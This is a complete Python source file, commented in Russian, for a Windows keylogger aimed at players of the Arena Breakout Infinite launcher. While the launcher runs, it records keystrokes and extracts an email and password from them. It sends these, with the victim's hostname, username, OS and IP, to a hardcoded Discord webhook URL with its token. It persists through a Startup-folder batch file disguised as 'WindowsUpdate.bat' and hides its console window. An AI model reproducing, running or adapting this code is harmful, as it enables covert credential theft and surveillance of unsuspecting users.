import os
import sys
import json
import time
import threading
from datetime import datetime
from typing import Optional, Dict, Any
import requests
import psutil
import platform
import socket
import ctypes
from ctypes import wintypes
import win32gui
import win32process
from pynput import keyboard
import logging

# ========== КОНФИГУРАЦИЯ ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1464587723355586604/eiWv452xBEOC53zJSlIU5aTEE13G230ZMQQI7PpnMzYsUf4cdjfDIWRINPbLqPEW0uaK"
TARGET_PROCESS = "arena_breakout_infinite_launcher"  # Имя процесса лаунчера
CHECK_INTERVAL = 1.0  # Проверка каждую секунду
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'windows_system_log.txt')
MAX_BUFFER_SIZE = 1024

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
current_buffer = ""
is_target_active = False
last_send_time = 0
cooldown_seconds = 3
keyboard_listener = None
credentials_found = False

# ========== СИСТЕМНАЯ ИНФОРМАЦИЯ ==========
def get_system_info() -> Dict[str, Any]:
    """Собирает информацию о системе"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # Получаем внешний IP
        try:
            external_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            external_ip = "Не удалось получить"
        
        return {
            "hostname": hostname,
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "ip_local": ip_address,
            "ip_external": external_ip,
            "os": f"{platform.system()} {platform.release()} {platform.version()}",
            "processor": platform.processor(),
            "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "python_version": platform.python_version(),
            "working_dir": os.getcwd()
        }
    except Exception as e:
        return {"error": str(e), "timestamp": datetime.now().isoformat()}

# ========== ДЕТЕКТОР ПРОЦЕССОВ ==========
def is_process_running(process_name: str) -> bool:
    """Проверяет, запущен ли процесс"""
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                return True
        return False
    except:
        return False

def get_active_window_process() -> Optional[str]:
    """Получает имя процесса активного окна"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return process.name()
    except:
        return None

# ========== ОБРАБОТКА ВВОДА ==========
def on_press(key):
    """Обработка нажатия клавиш"""
    global current_buffer, is_target_active
    
    if not is_target_active:
        return
    
    try:
        if hasattr(key, 'char') and key.char:
            current_buffer += key.char
        elif key == keyboard.Key.space:
            current_buffer += ' '
        elif key == keyboard.Key.enter:
            current_buffer += '\n'
            check_for_credentials()
        elif key == keyboard.Key.tab:
            current_buffer += '\t'
        elif key == keyboard.Key.backspace and len(current_buffer) > 0:
            current_buffer = current_buffer[:-1]
        
        # Ограничиваем размер буфера
        if len(current_buffer) > MAX_BUFFER_SIZE:
            current_buffer = current_buffer[-MAX_BUFFER_SIZE:]
            
    except Exception as e:
        log_error(f"Key press error: {e}")

def extract_credentials(buffer: str) -> Optional[Dict[str, str]]:
    """Извлекает email и пароль из буфера"""
    try:
        lines = buffer.strip().split('\n')
        
        # Ищем email
        email = None
        for line in lines:
            if '@' in line and '.' in line:
                # Простая проверка на email
                parts = line.strip().split()
                for part in parts:
                    if '@' in part and '.' in part:
                        email = part.strip()
                        break
                if email:
                    break
        
        if not email:
            return None
        
        # Ищем пароль (обычно после email)
        password = None
        email_index = buffer.find(email)
        if email_index != -1:
            # Берем текст после email до следующего перевода строки
            after_email = buffer[email_index + len(email):]
            if '\n' in after_email:
                next_line = after_email.split('\n')[0].strip()
                if next_line and '@' not in next_line and len(next_line) > 3:
                    password = next_line
        
        if email and password:
            return {"email": email, "password": password}
        return None
    except:
        return None

def check_for_credentials():
    """Проверяет буфер на наличие учетных данных"""
    global current_buffer, credentials_found, last_send_time
    
    if credentials_found:
        return
    
    credentials = extract_credentials(current_buffer)
    if credentials:
        current_time = time.time()
        if current_time - last_send_time > cooldown_seconds:
            credentials_found = True
            send_to_discord(credentials)
            last_send_time = current_time
            current_buffer = ""  # Очищаем буфер после отправки

# ========== DISCORD INTEGRATION ==========
def send_to_discord(credentials: Dict[str, str]):
    """Отправляет данные в Discord"""
    try:
        system_info = get_system_info()
        
        # Форматируем сообщение
        embed = {
            "title": "🔐 Arena Breakout - Credentials Captured",
            "color": 0x00ff00,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": [
                {
                    "name": "📧 Email",
                    "value": f"```{credentials['email']}```",
                    "inline": False
                },
                {
                    "name": "🔑 Password",
                    "value": f"```{credentials['password']}```",
                    "inline": False
                },
                {
                    "name": "💻 System Info",
                    "value": f"**PC:** {system_info['hostname']}\n"
                            f"**User:** {system_info['username']}\n"
                            f"**OS:** {system_info['os']}\n"
                            f"**IP:** {system_info['ip_local']}\n"
                            f"**Time:** {system_info['timestamp']}",
                    "inline": False
                }
            ],
            "footer": {
                "text": "SWILL Monitor v1.0"
            }
        }
        
        payload = {
            "embeds": [embed],
            "username": "System Monitor",
            "avatar_url": "https://i.imgur.com/7J7e1hT.png"
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        response = requests.post(
            WEBHOOK_URL,
            data=json.dumps(payload),
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 204 or response.status_code == 200:
            log_event(f"Data sent successfully: {credentials['email']}")
        else:
            log_error(f"Discord error: {response.status_code}")
            
    except Exception as e:
        log_error(f"Send error: {e}")

# ========== LOGGING ==========
def log_event(message: str):
    """Логирование событий"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except:
        pass

def log_error(error: str):
    """Логирование ошибок"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] ERROR: {error}\n"
    
    try:
        with open(LOG_FILE + '.errors', 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except:
        pass

# ========== STARTUP & PERSISTENCE ==========
def add_to_startup():
    """Добавляет программу в автозагрузку"""
    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        
        # Создаем BAT файл для запуска
        bat_content = f'@echo off\nstart /B "{exe_path}"\n'
        
        with open(bat_path, 'w') as f:
            f.write(bat_content)
            
        log_event("Added to startup")
        return True
    except Exception as e:
        log_error(f"Startup error: {e}")
        return False

def hide_console():
    """Скрывает консольное окно"""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE
    except:
        pass

# ========== MAIN MONITORING LOOP ==========
def monitor_loop():
    """Основной цикл мониторинга"""
    global is_target_active, current_buffer, credentials_found
    
    log_event("Monitor started")
    
    while True:
        try:
            # Проверяем запущен ли целевой процесс
            target_running = is_process_running(TARGET_PROCESS)
            
            if target_running and not is_target_active:
                # Процесс запустился
                log_event(f"Target process detected: {TARGET_PROCESS}")
                is_target_active = True
                credentials_found = False
                current_buffer = ""
                
            elif not target_running and is_target_active:
                # Процесс закрылся
                log_event("Target process closed")
                is_target_active = False
                credentials_found = False
                current_buffer = ""
            
            # Проверяем активное окно
            active_process = get_active_window_process()
            if active_process and TARGET_PROCESS.lower() in active_process.lower():
                # Целевое окно активно
                pass
            
            time.sleep(CHECK_INTERVAL)
            
        except Exception as e:
            log_error(f"Monitor loop error: {e}")
            time.sleep(5)

# ========== MAIN ==========
def main():
    """Основная функция"""
    try:
        # Скрываем консоль
        hide_console()
        
        # Добавляем в автозагрузку
        add_to_startup()
        
        # Запускаем мониторинг в отдельном потоке
        monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        monitor_thread.start()
        
        # Запускаем слушатель клавиатуры
        global keyboard_listener
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        
        log_event("Application fully initialized")
        
        # Бесконечный цикл
        while True:
            time.sleep(60)  # Проверяем каждую минуту
            
    except KeyboardInterrupt:
        log_event("Application stopped by user")
    except Exception as e:
        log_error(f"Main error: {e}")
    finally:
        if keyboard_listener:
            keyboard_listener.stop()

if __name__ == "__main__":
    main()